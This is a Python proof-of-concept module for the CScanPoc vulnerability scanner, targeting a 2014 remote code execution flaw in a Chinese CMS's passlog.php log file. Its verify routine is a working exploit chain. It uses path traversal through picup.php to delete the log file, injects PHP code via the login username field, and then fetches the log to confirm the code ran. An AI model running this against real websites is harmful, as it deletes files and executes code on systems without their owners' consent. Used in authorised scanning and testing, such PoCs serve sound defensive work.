# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'JISU_0002' # 平台漏洞编号，留空
    name = '台州市极速网络CMS /data/log/passlog.php 任意代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-12-03'  # 漏洞公布时间
    desc = '''
        台州市极速网络CMS /data/log/passlog.php 任意代码执行漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '台州市极速网络CMS'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2eb676d4-67ff-4a2b-9b1d-bf00baf25abf'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            url = self.target
            # del passlog
            del_url = '%s/picup.php?action=del&pic=../data/log/passlog.php' % url
            requests.get(del_url)
            # submit code
            login_url = '%s/login.php?action=login&lonadmin=1' % url
            login_data = {'loginuser': '<?php echo(md5(0));phpinfo();?>','loginpass':'0'}
            requests.post(login_url, data=login_data)
            # return page
            verify_url = '%s/data/log/passlog.php' % url
            content = requests.get(verify_url).content
            if 'cfcd208495d565ef66e7dff9f98764da' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
